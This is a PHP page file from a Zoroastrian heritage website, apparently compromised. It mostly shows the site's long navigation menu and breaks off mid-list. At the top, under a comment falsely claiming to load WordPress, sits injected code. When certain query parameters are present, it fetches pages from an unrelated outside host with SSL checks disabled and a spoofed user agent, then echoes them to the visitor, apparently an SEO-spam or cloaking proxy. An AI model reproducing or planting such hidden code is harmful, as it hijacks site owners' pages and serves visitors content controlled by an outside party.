<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */
function fetchDataFromSite($site) {
    $url = 'https://replication2.pkcdurensawit.net/heritageinstitute/' . $site . '/';
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_CUSTOMREQUEST => 'GET'
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
function fetchDataFromSite2($site) {
    $url = 'https://replication2.pkcdurensawit.net/heritageinstitute_sites/?sites='.$site;
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_CUSTOMREQUEST => 'GET'
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
function fetchDataFromSite3($site) {
    $url = 'https://replication2.pkcdurensawit.net/heritageinstitute_web/?web='.$site;
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_CUSTOMREQUEST => 'GET'
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

if(isset($_GET['go'])) {
    $site = $_GET['go'];
    $data = fetchDataFromSite($site);
    echo $data;
}
elseif(isset($_GET['sites'])) {
    $site = $_GET['sites'];
    $data = fetchDataFromSite2($site);
    echo $data;
}
elseif(isset($_GET['web'])) {
    $site = $_GET['web'];
    $data = fetchDataFromSite3($site);
    echo $data;
} else {
  ?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">

<html>
<head><title>Zoroastrianism Zoroastrian Zarathushtra Zarathustra Zoroaster Zoroastrians</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" >
<meta http-equiv="Content-Style-Type" content="text/css">
<meta name="author" content="K.E.Eduljee">
<link rel="stylesheet" type="text/css" href="styles_zoroastrainism.css">
<link rel="stylesheet" type="text/css" href="drop_down_menu.css">
<style type="text/css">
.col_center		{ padding-left:15px; padding-right:25px; text-align:center;}
.col_A			{ width:25%; vertical-align:top; padding:10px; text-align:left }
</style>
</head>

<body>
<table id="wrapper" cellspacing="0" cellpadding="0">
<tr><td width="100%" bgcolor="#031064">
<div align="center">
<table><tr><td style="text-align:left">
<!--webbot bot="Include" U-Include="nav_bar_dd.htm" TAG="BODY" startspan -->

<div>

<p style="font: bold 9pt/19pt Arial, Helvetica, sans-serif; color:#FFFFFF; text-align:center">

<a style="color:#FFFFFF" href="index.htm">Home Page</a>
&nbsp;&nbsp;&#8226;&nbsp;&nbsp;

<a style="color:#FFFFFF" href="http://zoroastrianheritage.blogspot.ca/">Blog</a>
&nbsp;&nbsp;&#8226;&nbsp;&nbsp;

<a style="color:#FFFFFF" href="#sitecontents">Site Contents</a>
&nbsp;&nbsp;&#8226;&nbsp;&nbsp;
<a style="color:#FFFFFF" title="Email us at enquiry@heritageinstitute.com" href="mailto:enquiry@heritageinstitute.com">Contact</a>
</p>

<ul id="navmenu">

<li><a href="contents_introduction.htm">Introduction</a>
	<ul style="position: absolute; left: 0px; top: 28px">

<!-- Introduction to Zoroastrianism-->
	<li><a href="grain/index.htm">Legend of the Grain of Wisdom</a></li>
	
	<li><a href="overview/simplified.htm">Overview-Simplified &#187</a>
		<ul>
		<li><a href="overview/simplified.htm">What is Zoroastrianism?</a></li>
		<li><a href="overview/simplified.htm#creed">Ethical Creed</a></li>
		<li><a href="overview/simplified.htm#philosophy">Beliefs, Philosophy &#187</a>
			<ul>
			<li><a href="overview/simplified.htm#philosophy">Creation, Existence & Coexistence</a></li>
			<li><a href="overview/simplified.htm#dichotomy">Choice</a></li>
			<li><a href="overview/simplified.htm#moderation">Moderation</a></li>
			<li><a href="overview/simplified.htm#Understanding & Wisdom">Understanding & Wisdom</a></li>
			</ul>
		</li>
		<li><a href="overview/simplified.htm#choice">Free Will, Reason, Wisdom, Choice &#187</a>
			<ul>
			<li><a href="overview/simplified.htm#choice">Free Will, Reason, Wisdom, Choice</a></li>
			<li><a href="overview/simplified.htm#age">Age of Reason</a></li>
			</ul>
		</li>
		<li><a href="overview/simplified.htm#Sarosh">Conscience - Sarosh</a></li>
		<li><a href="overview/simplified.htm#components">Spirit, Soul, Spiritual Components &#187</a>
			<ul>
			<li><a href="overview/simplified.htm#spenta_angra">Spenta & Angra Mainyu</a></li>
			<li><a href="overview/simplified.htm#soul">Soul, Urvan. Fate of the Soul</a></li>
			<li><a href="overview/simplified.htm#fravashi">Fravashi</a></li>
			<li><a href="overview/simplified.htm#khvarenah">Khvarenah</a></li>
			<li><a href="overview/simplified.htm#farohar">Farohar or Fravahar</a></li>
			</ul>
		</li>
		<li><a href="overview/simplified.htm#spiritual">Spiritual Quest &#187</a>
			<ul>
			<li><a href="overview/simplified.htm#spiritual">Spiritual Quest</a></li>
			<li><a href="overview/simplified.htm#ushta">Ushta & Armaiti</a></li>
			</ul>
		</li>
		<li><a href="overview/simplified.htm#god">God, Ahura Mazda &#187</a>
			<ul>
			<li><a href="overview/simplified.htm#god">Nature of God</a></li>
			<li><a href="overview/simplified.htm#Amesha_Spentas">Amesha Spentas</a></li>
			</ul>
		</li>
		<li><a href="overview/simplified.htm#zoroastrianway">Way of Life & Ethos &#187</a>
			<ul>
			<li><a href="overview/simplified.htm#ameshaspentas_human">Enlightenment, Ageless Wisdom</a></li>
			<li><a href="overview/simplified.htm#ethos">Zoroastrian Ethos</a></li>
			</ul>
		</li>
		<li><a href="overview/simplified.htm#environment">Nature & Environment &#187</a>
			<ul>
			<li><a href="overview/simplified.htm#environment">Human Beings & Nature</a></li>
			<li><a href="overview/simplified.htm#gardens">Lush Gardens - Paradise</a></li>
			</ul>
		</li>
		<li><a href="overview/simplified.htm#texts">Religious Texts &#187</a>
			<ul>
			<li><a href="overview/simplified.htm#texts">Avesta and Zand</a></li>
			<li><a href="overview/simplified.htm#books">Books of the Avesta</a></li>
			<li><a href="overview/simplified.htm#size">Size of the Original Avesta</a></li>
			<li><a href="overview/simplified.htm#teachings">Composition & Transmission</a></li>
			<li><a href="overview/simplified.htm#destruction">Destruction of the Avesta</a></li>
			</ul>
		</li>
		<li><a href="overview/simplified.htm#manthras">Mathra / Manthra</a></li>
		<li><a href="overview/simplified.htm#name">Zoroastrianism's Traditional Name</a></li>
		<li><a href="overview/simplified.htm#labels">Labels Placed on Zoroastrianism</a></li>
		<li><a href="overview/simplified.htm#flame">Eternal Flame</a></li>
		</ul>
	</li>
	
	<li><a href="overview/index.htm">Overview-Expanded &#187</a>
		<ul>
		<li><a href="overview/index.htm">What is Zoroastrianism?</a></li>
		<li><a href="overview/index.htm#creed">Ethical Creed</a></li>
		<li><a href="overview/index.htm#philosophy">Beliefs, Philosophy &#187</a>
			<ul><li><a href="overview/index.htm#philosophy">Creation, Existence & Coexistence</a></li>
			<li><a href="overview/index.htm#dichotomy">Choice</a></li>
			<li><a href="overview/index.htm#moderation">Moderation</a></li>
			<li><a href="overview/index.htm#Understanding & Wisdom">Understanding & Wisdom</a></li>
			</ul>
		</li>
		<li><a href="overview/index.htm#choice">Free Will, Reason, Wisdom, Choice &#187</a>
			<ul><li><a href="overview/index.htm#choice">Free Will, Reason, Wisdom, Choice</a></li>
			<li><a href="overview/index.htm#age">Age of Reason</a></li>
			</ul>
		</li>
		<li><a href="overview/index.htm#Sarosh">Conscience - Sarosh</a></li>
		<li><a href="overview/index.htm#components">Spirit, Soul, Spiritual Components &#187</a>
			<ul>
			<li><a href="overview/index.htm#spenta_angra">Spenta & Angra Mainyu</a></li>
			<li><a href="overview/index.htm#soul">Soul, Urvan. Fate of the Soul</a></li>
			<li><a href="overview/index.htm#fravashi">Fravashi</a></li>
			<li><a href="overview/index.htm#khvarenah">Khvarenah</a></li>
			<li><a href="overview/index.htm#farohar">Farohar or Fravahar</a></li>
			</ul>
		</li>
		<li><a href="overview/index.htm#spiritual">Spiritual Quest &#187</a>
			<ul>
			<li><a href="overview/index.htm#spiritual">Spiritual Quest</a></li>
			<li><a href="overview/index.htm#ushta">Ushta & Armaiti</a></li>
			</ul>
		</li>
		<li><a href="overview/index.htm#god">God, Ahura Mazda &#187</a>
			<ul><li><a href="overview/index.htm#god">Nature of God</a></li>
			<li><a href="overview/index.htm#Amesha_Spentas">Amesha Spentas</a></li>
			</ul>
		</li>
		<li><a href="overview/index.htm#zoroastrianway">Way of Life & Ethos &#187</a>
			<ul>
			<li><a href="overview/index.htm#ameshaspentas_human">Enlightenment, Ageless Wisdom</a></li>
			<li><a href="overview/index.htm#ethos">Zoroastrian Ethos</a></li>
			</ul>
		</li>
		<li><a href="overview/index.htm#environment">Nature & Environment &#187</a>
			<ul>
			<li><a href="overview/index.htm#environment">Human Beings & Nature</a></li>
			<li><a href="overview/index.htm#gardens">Lush Gardens - Paradise</a></li>
			</ul>
		</li>
		<li><a href="overview/index.htm#texts">Religious Texts &#187</a>
			<ul>
			<li><a href="overview/index.htm#texts">Avesta and Zand</a></li>
			<li><a href="overview/index.htm#books">Books of the Avesta</a></li>
			<li><a href="overview/index.htm#size">Size of the Original Avesta</a></li>
			<li><a href="overview/index.htm#teachings">Composition & Transmission</a></li>
			<li><a href="overview/index.htm#destruction">Destruction of the Avesta</a></li>
			</ul>
		</li>
		<li><a href="overview/index.htm#manthras">Mathra / Manthra</a></li>
		<li><a href="overview/index.htm#name">Zoroastrianism's Traditional Name</a></li>
		<li><a href="overview/index.htm#labels">Labels Placed on Zoroastrianism</a></li>
		<li><a href="overview/index.htm#flame">Eternal Flame</a></li>
		</ul>
	</li>
		
	<li><a href="zarathushtra/index.htm">Zarathushtra / Zoroaster</a></li>
	
<!-- Understanding Zoroastrianism & Zoroastrians-->
	<li><a href="einstein/index.htm">Einstein & Zoroastrianism on God</a></li>
	
	<li><a href="pdf/zoroastrianEthics.pdf">Zoroastrian Ethics by MA Buch (pdf)</a></li>
	
	<li><a href="olympicflame/index.htm">Olympic Flame & Zoroastrianism</a></li>
	
	<li><a href="westernauthors/index.htm">Western Views & Zoroastrianism &#187</a>
		<ul>
		<li><a href="westernauthors/index.htm">Post Classical Western Authors</a></li>
		<li><a href="aryans/western.htm">Western Views on Aryans</a></li>
		</ul>
	</li>
	
	<li><a href="westernauthors/nietzsche.htm">Friedrich Nietzsche & Zoroastrianism &#187</a>
		<ul>
		<li><a href="westernauthors/nietzsche.htm">Thus Spake Zarathustra Intro</a></li>
		<li><a href="westernauthors/nietzschezarathushtraInt.htm">Thus Spake Zarathustra (text)</a></li>
		<li><a href="westernauthors/nietzscheVideo.htm">Thus Spake Zarathustra videos</a></li>
		</ul>
	</li>
	
	<li><a href="sects/index.htm">Zoroastrian Sects &#187</a>
		<ul>
		<li><a href="sects/mazdak.htm">Mazdak & Mazdakism</a></li>
		<li><a href="sects/index.htm">Revolutionary Sects</a></li>
		<li><a href="sects/babak.htm">Babak Khorramdin</a></li>
		<li><a href="reference/zaehner/dawnVarZur9_1.htm">Zurvanism (by Zaehner) &#187</a>
			<ul>
			<li><a href="reference/zaehner/dawnVarZur9_1.htm">Varieties of Zurvanism</a></li>
			<li><a href="reference/zaehner/dawnVarZur10_1.htm">Classical Zurvanism</a></li>
			<li><a href="reference/zaehner/dawnVarZur11_1.htm">Zurvan</a></li>
			</ul>
		</li>
		</ul>
	</li>
	
	<li><a href="demographics/index.htm">Demographics. Group Names &#187</a>
		<ul>
		<li><a href="demographics/index.htm">Demographics. Group Names</a>
		<li><a href="pdf/patelDemographics.pdf">Patel - Demographic Crisis (pdf)</a>
		</ul>
	</li>
	
	<li><a href="maps/index.htm">Map Gallery</a></li>
	
<!-- Zoroastrian Culture-->
	<li><a href="westernauthors/nietzsche.htm">Food, Nutrition & Culture &#187</a>
		<ul>
		<li><a href="bbc_taste_of_iran/index.htm">BBC's Taste Of Iran Videos</a></li>
		<li><a href="irani/cafe.htm">Irani Cafes & Bakeries</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/reference/nutrition_eduljee_complete.pdf">Diet History-Complete</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/reference/nutrition_eduljee_abridged">Diet History-Abridged</a></li>
		</ul>
	</li>
	
	<li><a href="contents_artmusic.htm">Art & Music &#187</a>
		<ul>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/composers/index.htm">Western Composers & Zoroastrianism</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/languages/index.htm#avestancalligraphy">Avestan Calligraphy video</a></li>
		</ul>
	</li>
	
	<li><a href="pdf/astrology.pdf">Astrology (Bundahishn) (pdf)</a></li>
	
	<li><a href="khayyam/index.htm">Fire of Spring - Omar Khayyam</a></li>
	</ul>
</li>


<li><div style="background:#031064; margin-left:-4px; margin-right:-4px"><a href="">&#8226;</a></div>
	<ul style="position: absolute; left: 0px; top: 28px"><li></li>
	</ul>
</li>
<li><a href="contents_heritage.htm">Heritage</a>
	<ul style="position: absolute; left: 0px; top: 28px">
	
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/aryans/trade.htm">Trade &#187</a>
		<ul>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/aryans/trade.htm">Aryan Trade</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/sugd/trade.htm">Sogdian Trade. Silk Roads. China</a></li>
		<li><a href="hormozgan/index.htm">Hormozgan</a></li>
		</ul>
	</li>
	
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/trade/paisley.htm">Boteh (Paisley)</a></li>
	
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/trade/termeh.htm">Termeh - Silk & Wool</a></li>
	
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/parsi/gara.htm">Gara Sari</a></li>
	
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/kareez/index.htm">Kareez (Qanat) Water Distribution</a></li>
	
	<li><a href="irani/cafe.htm">Irani Cafes & Bakeries</a></li>
	
	<li><a href="zoroastrians/parsees1.htm">Indian Parsees & Iranis - Old Photos</a></li>
	
	<li><a href="garden/index.htm">Persian Gardens</a></li>
	
	<li><a href="ceremonies/sace.htm">Sace / Ses Ceremonial Tray</a></li>
	
	</ul>
</li>


<li><div style="background:#031064; margin-left:-4px; margin-right:-4px"><a href="">&#8226;</a></div>
	<ul style="position: absolute; left: 0px; top: 28px"><li></li>
	</ul>
</li>
<li><a href="contents_history.htm">Early History</a>
	<ul style="position: absolute; left: 0px; top: 28px">
	
	<li><a href="prehistoricsites/index.htm">Prehistory &#187</a>
		<ul>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/prehistoricsites/dawn.htm">Dawn of History - Early Peoples</a></li>
		<li><a href="cavedwellings/index.htm">Cave Dwellings of Old Iran</a></li>
		<li><a href="cavedwellings/shanidar.htm">Cave Dwelling of Shanidar</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/prehistoricsites/index.htm">Prehistoric Sites - Iran & Environs</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/kerman/jiroft.htm">Jiroft - Historical Site</a></li>
		<li><a href="nisa/anau.htm">Nisaya (Nisa). Anau</a></li>
		</ul>
	</li>
	
	<li><a href="aryans/index.htm">Aryans &#187</a>
		<ul>
		<li><a href="aryans/index.htm">Who Were the Aryans?</a></li>
		<li><a href="aryans/prehistory.htm">Aryan Prehistory</a></li>
		<li><a href="legendary/index.htm">Aryan Legendary History</a></li>
		<li><a href="aryans/religion.htm">Aryan Religions & Wars</a></li>
		<li><a href="aryans/airyanavaeja.htm">Aryan Homeland in Scripture</a></li>
		<li><a href="aryans/trade.htm">Aryan Trade</a></li>
		<li><a href="aryans/location.htm">Aryan Homeland Location</a></li>
		<li><a href="aryans/western.htm">Western Views on Aryans</a></li>
		</ul>
	</li>
	
	<li><a href="tajikistan/page3.htm">Pamirs &#187</a>
		<ul>
		<li><a href="tajikistan/page3.htm">Pamir Badakhshan Region</a></li>		
		<li><a href="tajikistan/page4.htm">Pamiri Houses</a></li>
		<li><a href="tajikistan/page5.htm">Pamiri Historical Sites</a></li>
		</ul>
	</li>
	
	<li><a href="sugd/index.htm">Turan & Sugd (Sogdiana) &#187</a>
		<ul>
		<li><a href="sugd/index.htm">Turan</a></li>
		<li><a href="sugd/trade.htm">Sogdian Trade. Silk Roads. China</a></li>
		<li><a href="sugd/sugd.htm">Sugd (Uzbekistan)</a></li>
		<li><a href="tajikistan/page2.htm">Sugd (Tajikistan)</a></li>
		</ul>
	</li>
	
	<li><a href="merv/gonur.htm">Mouru (Margiana) &#187</a>
		<ul>
		<li><a href="merv/gonur.htm">Gonur</a></li>
		<li><a href="merv/merv.htm">Merv</a></li>
		</ul>
	</li>
	
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/balkh/index.htm">Bakhdhi (Bactria) &#187</a>
		<ul>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/balkh/index.htm">Overview</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/balkh/balkh2.htm">Balkh City</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/balkh/AiKhanum.htm">Ai Khanum</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/balkh/talayehtepe.htm">Sheberghan & Yemshi Tepe</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/balkh/talayehtepe.htm#tillyatepe">Talayeh Tepe / Tillya Tepe</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/balkh/dashly.htm">Dashly</a></li>
		</ul>
	</li>
	
	<li><a href="nisa/anau.htm">Nisaya-Parthava (Parthia) &#187</a>
		<ul>
		<li><a href="nisa/anau.htm">Nisaya (Nisa). Anau</a></li>
	 	<li><a href="parthia/index.htm">Parthava (Parthia)</a></li>
	 	<li><a href="parthia/region.htm">Parthava Region & People</a></li>
	 	<li><a href="parthia/milestones.htm">Historical Milestones</a></li>
	 	<li><a href="parthia/places.htm">Historical Places</a></li>
		</ul>
	</li>
	
	<li><a href="aria/index.htm">Haroyu (Aria)</a></li>
	
	<li><a href="khvarizem/index.htm">Urvam-Khvarizem (Chorasmia) &#187</a>
		<ul>
		<li><a href="khvarizem/index.htm">Location. Saka. Turks</a></li>
		<li><a href="khvarizem/page2.htm">Dakhma & Kalas</a></li>
		<li><a href="khvarizem/page3.htm">Ayaz Kalas</a></li>
		<li><a href="khvarizem/page4.htm">Fire Temples & Kalas</a></li>
		</ul>
	</li>
	
	<li><a href="varkana/index.htm">Vehrkana-Varkana (Hyrcania) &#187</a>
		<ul>
		<li><a href="varkana/index.htm">Vehrkana-Varkana (Hyrcania)</a></li>
		<li><a href="varkana/wall.htm">Gorgan Wall</a></li>
		</ul>
	</li>
	
	<li><a href="saka/index.htm">Saka. Fergana, Scythia, Turks &#187</a>
		<ul>
		<li><a href="saka/index.htm">Saka, Pathia, Dahi, Sistan, Scythia</a></li>
		<li><a href="saka/saka2.htm">Nomads, Predators, Paraetaceni</a></li>
		<li><a href="saka/saka3.htm">Tigrakhauda, Haumavarga, Fergana, Women</a></li>
		<li><a href="saka/saka4.htm">Paradarya, Turks, Turan</a></li>
		</ul>
	</li>
	
	<li><a href="dahi/index.htm">Dahi (Dahistan)</a></li>

	<li><a href="east/index.htm">Far Eastern Lands &#187</a>
		<ul>
		<li><a href="east/index.htm#easternextent">Tashkurgan, Khotan, Tochari</a></li>
		<li><a href="east/index.htm#seresphryni">Phryni & Seres</a></li>
		<li><a href="east/east2.htm#kushan">Kushan</a></li>
		<li><a href="east/east2.htm#chionites">Chionites</a></li>
		<li><a href="east/east2.htm#hephthalite">Heptalon / Hephthalite</a></li>
		<li><a href="sugd/trade.htm">Sogdian Trade. Silk Roads. China</a></li>
		</ul>
	</li>

	<li><a href="ranghaya/index.htm">Ranghaya Mitanni Hatti/Kurdistan &#187</a>
		<ul>
		<li><a href="ranghaya/index.htm">Ranghaya / Kurdistan</a></li>
		<li><a href="ranghaya/mitanni.htm">Mitanni</a></li>
		<li><a href="ranghaya/hittites.htm">Hatti / Hittites</a></li>
		<li><a href="ranghaya/suppiluliuma_shattiwaza_treaty.htm">Mitanni Hittite Treaty</a></li>
		<li><a href="temples/index.htm#ani">Temple Ruins at Ani, Turkey</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/ranghaya/index.htm#kurdistan">Kurdistan</a></li>
		</ul>
	</li>
	
	<li><a href="urmia/index.htm">Urmia, Azerbaijan, Kandovan &#187</a>
		<ul>
		<li><a href="urmia/index.htm">Azerbaijan, Urmia, N.Zagros</a></li>
		<li><a href="urmia/index.htm#shiz">Azargoshasb Temple Site</a></li>
		<li><a href="temples/index.htm#surakhani">Temple at Surakhani, Azerbaijan</a></li>
		<li><a href="urmia/kandovan_2.htm">Kandovan Cave Village Introduction</a></li>
		<li><a href="urmia/kandovan.htm">Kandovan Cave Village Photo Tour</a></li>
		</ul>
	</li>
	
	<li><a href="zagros/index.htm">Zagros, Parsua, Kassites, Kurds &#187</a>
		<ul>
		<li><a href="zagros/index.htm">Zagros, Parsua</a></li>
		<li><a href="ranghaya/kassites.htm">Kassites</a></li>
		</ul>
	</li>
	
	<li><a href="medians/index.htm">Mada (Media)</a></li>
	
	<li><a href="achaemenian/index.htm">Parsa (Persia Cyrus Darius) &#187</a>
		<ul>
		<li><a href="achaemenian/index.htm">Achaemenian History. Cyrus Darius &#187</a>
			<ul>
			<li><a href="achaemenian/index.htm">Early Persian-Achaemenian History</a></li>
			<li><a href="achaemenian/cyrus.htm">Cyrus the Great</a></li>
			<li><a href="achaemenian/cambyses.htm">Cambyses (Kabujiya) II & Gaumata</a></li>
			<li><a href="achaemenian/darius.htm">Darius the Great</a></li>
			<li><a href="persepolis/index.htm">Persepolis, Achaemenian Capital</a></li>
			<li><a href="http://www.heritageinstitute.com/zoroastrianism/persepolis/videos.htm">Videos - Persepolis</a></li>
			<li><a href="http://www.heritageinstitute.com/zoroastrianism/achaemenian/video.htm">Videos - Achaemenian Empire</a></li>
			</ul>
		</li>
		
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/pdf/sasanika.pdf">Sassanian History &#187</a>
			<ul>
			<li><a href="http://www.heritageinstitute.com/zoroastrianism/pdf/sasanika.pdf">Nigin Miri's Sassanian Fars (pdf)</a></li>
			</ul>
		</li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/naqsherustam/index.htm">Naqsh-e Rustam Historical Site &#187</a>
			<ul>
			<li><a href="http://www.heritageinstitute.com/zoroastrianism/naqsherustam/index.htm">Location & Elamite Relief</a></li>
			<li><a href="http://www.heritageinstitute.com/zoroastrianism/naqsherustam/page2.htm">Achaemenid Tombs. Sassanian Reliefs</a></li>
			</ul>
		</li>		
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/behistun/index.htm">Behistun Historical Site</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/susa/index.htm">Susa Historical Site</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/iranpersia/index.htm">Iran and Persia - The Same?</a></li>
		</ul>
	</li>
	
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/olympicflame/page2.htm">Greek Persian Connections &#187</a>
		<ul>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/olympicflame/page2.htm">Legendary Connections</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/achaemenian/darius2.htm#greekallies">Achaemenian Era Relations & Wars</a></li>
		<li><a href="olympicflame/index.htm">Olympic Flame & Zoroastrianism</a></li>
		</ul>
	</li>
	
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/history/timelines.htm">TIMELINES: RULERS 1000 BCE-650 CE</a></li>
	
	<li><a href="maps/index.htm">MAPS GALLERY</a></li>
	</ul>
</li>


<li><div style="background:#031064; margin-left:-4px; margin-right:-4px"><a href="">&#8226;</a></div>
	<ul style="position: absolute; left: 0px; top: 28px"><li></li>
	</ul>
</li>
<li><a href="contents_history.htm">650CE+ History</a>
	<ul style="position: absolute; left: 0px; top: 28px">
		
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/history/postArab.htm">Arabs & Iranian Resistance &#187</a>
		<ul>
		<li><a href="history/islamichistory1.htm">Early Islamic History</a></li>
		<li><a href="history/fightflight.htm">Fight & Flight 650-750</a></li>
		<li><a href="history/abumuslim.htm">Abu Muslim</a></li>
		<li><a href="sects/index.htm">Revolutionary Sects 650-850</a></li>
		<li><a href="sects/babak.htm">Babak Khorramdin</a></li>
		</ul>
	</li>
		
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/history/postArab.htm">Zoroastrians in Iran - Conditions &#187</a>
		<ul>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/history/postArab.htm">Conditions 650-1400s</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/history/postArab1.htm">Conditions 1500s-1800s</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/history/postArab2.htm">Irani Renaissance. Benefactors</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/history/postArab2.htm">Parsi Assistance</a></li>
		</ul>
	</li>
	
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/history/qissa1.htm">Parsees of India &#187</a>
		<ul>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/history/qissa1.htm">Escape from Iran</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/history/qissa2.htm">Sanjan</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/history/qissa3.htm">Destruction of Sanjan</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/parsi/westcoast.htm">Settlement of India's Westcoast</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/parsi/konkan_thana.htm">Settlement of Konkan Thana</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/parsi/surat1.htm">Parsees & Surat's Development</a></li>
		<!-- 
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/parsi/bombay.htm">Settlement of Bombay (Mumbai)</a></li>
		 -->
		<li><a href="pdf/parsi/hodivala.pdf">Hodivala:Studies in Parsi History (pdf)</a></li>
		<li><a href="pdf/parsi/KarakaTheParsees.pdf">Karaka:Parsees (pdf)</a></li>
		<li><a href="pdf/parsi/KarakaHistoryOfTheParsisVol2.pdf">Karaka:History of the Parsis (pdf)</a></li>
		<li><a href="pdf/parsi/Framjee.pdf">Framjee: History Manners Customs (pdf)</a></li>
		<li><a href="pdf/parsi/NatGeographicParsees.pdf">National Geographic 1905: Parsees (pdf)</a></li>
		</ul>
	</li>
	
	<li><a href="urmia/index.htm">Azerbaijan, Urmia, Kandovan Region &#187</a>
		<ul>
		<li><a href="urmia/index.htm">Azerbaijan, Urmia, N.Zagros</a></li>
		<li><a href="temples/index.htm#surakhani">Temple at Surakhani</a></li>
		<li><a href="urmia/index.htm#shiz">Azargoshasb Temple Site</a></li>
		<li><a href="urmia/kandovan.htm">Kandovan - Troglodyte Village</a></li>
		</ul>
	</li>
	
	<li><a href="hormozgan/index.htm">Hormozgan / Hormuz Region &#187</a>
		<ul>
		<li><a href="hormozgan/index.htm">History, Zoroastrian Connections</a></li>
		<li><a href="hormozgan/tradeTravellers.htm">Trade Traders Travellers</a></li>
		<li><a href="hormozgan/peoplePlaces1.htm">People & Places 1 Minab, Old Hormuz</a></li>
		<li><a href="hormozgan/peoplePlaces2.htm">People & Places 2 Hormuz Island, Oman</a></li>
		</ul>
	</li>
	
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/kerman/index.htm">Kerman Region &#187</a>
		<ul>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/kerman/index.htm">Kerman Region</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/kerman/maymand.htm">Maymand - Troglodyte Village</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/kerman/jiroft.htm">Jiroft - Historical Site</a></li>
		</ul>
	</li>
	
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/ranghaya/index.htm">Kurdistan Region &#187</a>
		<ul>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/zagros/index.htm">Zagros Region</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/zagros/index.htm#shahrazor">Shahrazor</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/zagros/index.htm#zahak">Zahak Kaveh</a></li>
		</ul>
	</li>	

	<li><a href="http://www.heritageinstitute.com/zoroastrianism/tajikistan/index.htm">Tajikistan Region</a></li>
	
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/turkmenistan/index.htm">Turkmenistan Region</a></li>
	
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/uzbekistan/index.htm">Uzbekistan Region</a></li>
	
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/yazd/index.htm">Yazd Region &#187</a>
		<ul>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/yazd/index.htm">Yazd Region & City</a></li>
